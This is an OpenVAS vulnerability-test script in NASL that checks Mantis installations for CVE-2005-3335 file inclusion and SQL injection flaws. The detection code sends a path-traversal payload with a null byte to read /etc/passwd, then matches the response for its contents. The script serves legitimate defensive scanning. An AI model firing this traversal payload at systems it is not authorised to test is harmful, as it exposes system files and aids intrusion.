# OpenVAS Vulnerability Test
# $Id: mantis_file_incl_sql_inject.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Mantis File Inclusion and SQL Injection Flaws
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote version of Mantis suffers from a remote file inclusion
vulnerability.  Provided PHP's 'register_globals' setting is enabled,
An attacker may be able to leverage this issue to read arbitrary files
on the local host or to execute arbitrary PHP code, possibly taken
from third-party hosts. 

In addition, the installed version reportedly may be prone to SQL
injection, cross-site scripting, and information disclosure attacks.";

tag_solution = "Upgrade to Mantis 0.19.3 or newer.";

# Ref:  Andreas Sandblad, Secunia Research

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20093");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3335");
  script_bugtraq_id(15210, 15212);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  
  script_name("Mantis File Inclusion and SQL Injection Flaws");


  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("mantis_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2005-46/advisory/");
  script_xref(name : "URL" , value : "http://sourceforge.net/mailarchive/forum.php?thread_id=8517463&forum_id=7369");
  exit(0);
}

#the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/mantis"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

 req = http_get(item:string(dir, "/bug_sponsorship_list_view_inc.php?t_core_path=../../../../../../../../../../etc/passwd%00"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(res == NULL) exit(0);
 if (
   egrep(pattern:"root:.*:0:[01]:", string:res) ||
   egrep(pattern:"Warning.+main\(/etc/passwd.+failed to open stream", string:res) ||
   egrep(pattern:"Failed opening .*'/etc/passwd", string:res)
 ) {
       security_message(port);
       exit(0);
 }
}
